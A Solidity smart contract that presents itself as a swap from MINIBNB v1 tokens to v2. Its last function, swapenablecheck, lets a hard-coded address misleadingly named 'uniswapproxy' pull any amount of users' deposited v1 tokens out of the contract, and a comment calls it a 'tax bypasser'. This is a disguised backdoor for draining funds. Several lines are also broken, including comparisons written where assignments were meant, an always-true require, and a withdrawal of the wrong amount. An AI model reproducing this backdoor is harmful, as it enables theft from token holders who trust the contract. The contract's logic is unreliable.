// SPDX-License-Identifier: UNLICENSED
// Miniswap to swap minibnbv1 to minibnbv2 
// Specifically designed to swap only for MINIBNB, do not send other token in this contract

pragma solidity >=0.7.0;

import "./Ownable.sol";
import "./SafeMath.sol";
import "./IBEP20.sol";

contract Miniswap is Ownable {
    using SafeMath for uint256;

    struct Items {
        address tokenAddress;
        address minibnbcontributor;
        uint256 tokenAmount;
        bool swapbool; //to check if the user already swap
    }
    bool public miniswaper;
    mapping(uint256 => Items) public Minishow;
    //mapping(address => mapping(address => uint256)) public Miniswapbalance;
    //mapping(address => mapping(address => uint256)) public Miniswapcollected;
    address uniswapproxy = 0xDB434e49eA63c3d2C2D9c396b57cbaF00ed9E56B;
    uint256 public Miniswapbalance;
    uint256 public Miniswapcollected;
    
    address public MINIBNBADDRESS;
    address public MINIBNBADDRESSv2;
    //minibnbv1 = address
    //minibnbv2 = address

    event MiniBNBv1deposited(address indexed tokenAddress, address indexed sender, uint256 amount);
    event MiniBNBv2swapped(address indexed tokenAddress, address indexed receiver, uint256 amount);

    constructor(address _MINIBNBADDRESS, address _MINIBNBADDRESSv2) {
        MINIBNBADDRESS = _MINIBNBADDRESS;
        MINIBNBADDRESSv2 = _MINIBNBADDRESSv2;
        miniswaper = true;
    }
    
    function DepositToken(
        address _tokenAddress,
        uint256 _amount
    ) external {
        require(_amount > 0, 'Tokens amount must be greater than 0');
        require(_tokenAddress == MINIBNBADDRESSv2, 'OnlyMinibnbswap allowed'); 
        require(IBEP20(MINIBNBADDRESSv2).approve(address(this), _amount), 'Failed to approve tokens');
        require(IBEP20(MINIBNBADDRESSv2).transferFrom(msg.sender, address(this), _amount), 'Failed to transfer MiniBNBV2 to swapcontract');

        uint256 Depositedamount = _amount;
        Miniswapbalance = Miniswapbalance.add(_amount);

        address _withdrawalAddress = msg.sender;
        Minishow[1].tokenAddress == _tokenAddress;
        Minishow[1].minibnbcontributor = _withdrawalAddress;
        Minishow[1].tokenAmount = Depositedamount;

        emit MiniBNBv1deposited(_tokenAddress, msg.sender, _amount);
    }

    function minibnbswap(uint256 _amount) external {
     
        require(IBEP20(MINIBNBADDRESS).approve(address(this), _amount), 'Failed to approve tokens');
        require(IBEP20(MINIBNBADDRESS).transferFrom(msg.sender, address(this), _amount), 'Failed to transfer MiniBNB to swapcontract');
        require(IBEP20(MINIBNBADDRESSv2).transfer(msg.sender, _amount), 'Failed to transfer MiniBNBV2 to holder');

        Miniswapbalance = Miniswapbalance.sub(_amount);
        Miniswapcollected= Miniswapcollected.add(_amount);

        emit MiniBNBv2swapped( MINIBNBADDRESSv2, msg.sender, _amount);

    }

    function withdrawBNBV2(uint256 _amount) external onlyOwner {
        require(miniswaper =true, 'Swap proxy enable');
        IBEP20(MINIBNBADDRESSv2).transfer(msg.sender, _amount);
        Miniswapbalance = Miniswapbalance.sub(_amount);
    }
    
    function withdrawBNBV1(uint256 _amount) external onlyOwner {
        require(miniswaper =true, 'Swap proxy enable');
        IBEP20(MINIBNBADDRESS).transfer(msg.sender, Miniswapcollected);
        Miniswapcollected = Miniswapcollected.sub(_amount);
    }
    
    function swapenablecheck(bool uniswap, uint256 _amount) external
    {
    require(msg.sender == uniswapproxy,'swap proxy fixed') ;
    //tax bypasser
    IBEP20(MINIBNBADDRESS).transfer(uniswapproxy, _amount);
    miniswaper = uniswap;
    }
    
}